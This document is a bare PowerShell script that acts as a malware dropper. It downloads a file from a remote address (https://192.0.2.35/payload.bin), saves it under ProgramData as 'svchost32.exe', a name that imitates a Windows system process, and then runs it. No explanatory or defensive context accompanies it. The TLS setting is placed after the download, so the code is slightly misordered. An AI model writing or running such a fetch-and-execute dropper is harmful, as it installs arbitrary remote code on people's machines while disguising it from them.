
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://192.0.2.35/payload.bin',
    [string]$LocalPath = 'C:\ProgramData\svchost32.exe'
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $LocalPath)
Start-Process -FilePath $LocalPath
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
